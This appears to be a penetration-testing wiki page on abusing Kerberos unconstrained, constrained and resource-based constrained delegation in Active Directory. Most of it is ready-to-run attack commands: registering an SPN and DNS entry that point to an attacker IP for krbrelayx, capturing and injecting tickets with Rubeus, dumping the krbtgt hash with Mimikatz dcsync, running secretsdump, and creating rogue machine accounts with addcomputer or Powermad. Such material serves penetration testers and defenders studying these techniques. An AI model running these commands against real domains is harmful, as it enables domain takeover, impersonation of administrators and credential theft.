# Kerberos delegations

## Theory

There are three types of Kerberos delegations

* **Unconstrained delegations \(KUD\)**: a service can impersonate users on any other service.
* **Constrained delegations \(KCD\)**: a service can impersonate users on a set of services
* **Resource based constrained delegations \(RBCD\)** : a set of services can impersonate users on a service

{% hint style="info" %}
With constrained and unconstrained delegations, the delegation attributes are set on the impersonating service whereas with RBCD, these attributes are set on the final resource or computer account itself.
{% endhint %}

Kerberos delegations can be abused by attackers to obtain valuable assets and sometimes even domain admin privileges.

## Practice

{% hint style="warning" %}
For any type of delegation \(unconstrained, constrained and resource-based constrained\), an account with `AccountNotDelegated`set can't be impersonated
{% endhint %}

### Unconstrained Delegations

If a computer, with unconstrained delegations privileges, is compromised, an attacker wait for a privileged user to authenticate on it \(or [force it](../forced-authentications/)\).

1. The authenticating user will send a TGS \(service ticket\) containing a TGT \(Ticket Granting Ticket\).
2. The attacker can extract that TGT and use it with to request a TGS for another service.
3. The attacker can use the TGS obtained to access the service it grants access to with [pass-the-ticket](pass-the-ticket.md).

{% hint style="info" %}
Unconstrained delegation abuses are usually combined with the [PrinterBug](../forced-authentications/#ms-rprn-abuse-a-k-a-printer-bug) or [PrivExchange](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.
{% endhint %}

{% tabs %}
{% tab title="From the attacker machine \(UNIX-like\)" %}
In order to abuse the unconstrained delegations privileges of a computer account, an attacker must add his machine to the SPNs of the compromised account and add a DNS entry for it.

This allows targets \(like Domain Controllers and Exchange servers\) to authenticate back to the attacker machine.

This can be done with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) \(Python\).

```bash
# Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\MachineAccont$' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\MachineAccont$' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
krbrelayx.py -aesKey 'MachineAccount_AES_key'
```

Once the krbrelayx listener is ready, a [forced authentication attack](../forced-authentications/) \(e.g. [PrinterBug](../forced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. The listener will then receive an authentication, hence a TGS, containing a TGT.

That TGT can then be used with [pass-the-ticket](pass-the-ticket.md) capable tools like [Impacket](https://github.com/SecureAuthCorp/impacket) scripts.

```bash
export KRB5CCNAME=ticket.ccache
secretsdump.py -k $TARGET
```
{% endtab %}

{% tab title="From the compromised computer \(Windows\)" %}
Once the KUD capable host is compromised, [Rubeus](https://github.com/GhostPack/Rubeus) can be used \(on the compromised host\) to as a listener to wait for a user to authenticate, the TGS to show up and to extract the TGT it contains.

```bash
Rubeus.exe monitor /interval:5
```

Once the monitor is ready, a [forced authentication attack](../forced-authentications/) \(e.g. [PrinterBug](../forced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. Rubeus will then receive an authentication \(hence a TGS, containing a TGT\). The TGT can be used to request a TGS for another service.

```bash
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
```

Once the ticket is injected, it can natively be used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash.

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
{% endtab %}
{% endtabs %}

### Constrained Delegations

If an account, configured with constrained delegation to a service, is compromised, an attacker can impersonate any user \(e.g. local admin\) in the environment to access that service.

1. The attacker can request a delegation TGT
2. The TGT can be used to request a TGS on behalf of the account to impersonate. 
3. This TGS can be used to access the service the compromised account can delegate to.
4. The attacker can use the TGS obtained to access the service it grants access to with [pass-the-ticket](pass-the-ticket.md).

{% hint style="info" %}
The problem with constrained delegation is that an attacker in control of a KCD capable account can abuse it and gain administrator privileges to every resource that account can delegate to.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can perform all the necessary steps to obtain the final "impersonating" TGS \(in this case, "Administrator" is impersonated but it can be any user in the environment\).

The input credentials are those of the compromised account configured with constrained delegations.

```bash
getST.py -spn $target_SPN -impersonate Admnistrator -dc-ip $DomainController $DOMAIN/$USER:$PASSWORD
```

The TGS can then be used with [pass-the-ticket](pass-the-ticket.md) to obtain access to the target service \(example with [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\).

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k $TARGET
```
{% endtab %}

{% tab title="Windows" %}
[Rubeus ](https://github.com/GhostPack/Rubeus)can be used to request the delegation TGT and the "impersonation TGS".

```bash
# Request the TGT
Rubeus.exe tgtdeleg

# Request the TGS and inject it for pass-the-ticket
Rubeus.exe s4u /ticket:$base64_extracted_TGT /impersonateuser:Administrator /domain:$DOMAIN /msdsspn:$Target_SPN /dc:$DomainController /ptt
```

Once the ticket is injected, it can natively be used when accessing the service \(see [pass-the-ticket](pass-the-ticket.md)\).
{% endtab %}
{% endtabs %}

### Resource Based Constrained Delegations \(RBCD\)

If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object \(e.g. the `GenericWrite` ACE, see [Abusing ACLs](../abusing-aces.md)\), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

Then, in order to abuse this, the attacker has to control the computer account the object's attribute has been populated with.

In this situation, an attacker can obtain admin access to the target resource \(the object configured for RBCD in the first step\).

1. Create a computer account leveraging the `MachineAccountQuota` setting
2. Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object with the machine account created, using the credentials of a domain user that has the capability to populate attributes on the target object \(e.g. `GenericWrite`\).
3. Using the computer account credentials, request a ticket to access the target resource

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) can be used to create a computer account, using the credentials of a domain user \(with`ms-DS-MachineAccountQuota` &gt; 0, by default it is set to 10\).

```bash
addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\anonymous:anonymous'
```

The [rbcd-attack](https://github.com/tothi/rbcd-attack) script \(Python\) can be used to modify the delegation rights, using the credentials of a domain user

```bash
rbcd-attack -f SHUTDOWN -t $Target -dc-ip $DomainController 'DOMAIN\anonymous:anonymous'
```

The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can then perform all the necessary steps to obtain the final "impersonating" TGS \(in this case, "Administrator" is impersonated but it can be any user in the environment\).

```bash
getST.py -spn $target_SPN -impersonate Admnistrator -dc-ip $DomainController 'DOMAIN/SHUTDOWN$:SomePassword'
```

{% hint style="warning" %}
In some mysterious cases, using [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) to create a computer account resulted in the creation of a **disabled** computer account.
{% endhint %}

Impacket's ntlmrelayx can also conduct an RBCD abuse with the `--delegate-access` option \(see [NTLM relay](../abusing-ntlm/ntlm-relay.md)\).
{% endtab %}

{% tab title="Windows" %}
The following command can be used to run network operations as a domain user \(prompt for password\)

```bash
runas /netonly /user:$DOMAIN\$USER powershell
```

Check the domain user we control can create a machine account \(`ms-DS-MachineAccountQuota` &gt; 0, by default it is set to 10\).

```text
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
```

[Powermad](https://github.com/Kevin-Robertson/Powermad) can be used to create a machine account.

```bash
Import-Module .\Powermad.ps1
$password = ConvertTo-SecureString 'SomePassword' -AsPlainText -Force
New-MachineAccount -machineaccount 'SHUTDOWN' -Password $($password)
```

The PowerShell Active Directory Module's cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object \(in this case, to modify the delegation rights\).

```bash
# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'SHUTDOWN$'

# Check the populated attribute
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
```

[Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the "impersonation TGS" and inject it for later use.

```bash
Rubeus.exe s4u /user:SHUTDOWN$ /rc4:$computed_NThash /impersonateuser:Administrator /msdsspn:$Target_SPN /ptt
```

The NT hash can be computed as follows.

```bash
Import-Module .\DSInternals.ps1
ConvertTo-NTHash $password
```

Once the ticket is injected, it can natively be used when accessing the service \(see [pass-the-ticket](pass-the-ticket.md)\).
{% endtab %}
{% endtabs %}

## References

{% embed url="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/" caption="" %}

{% embed url="https://blog.stealthbits.com/unconstrained-delegation-permissions/" caption="" %}

{% embed url="https://blog.stealthbits.com/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/" caption="" %}

{% embed url="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" caption="" %}

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" caption="" %}

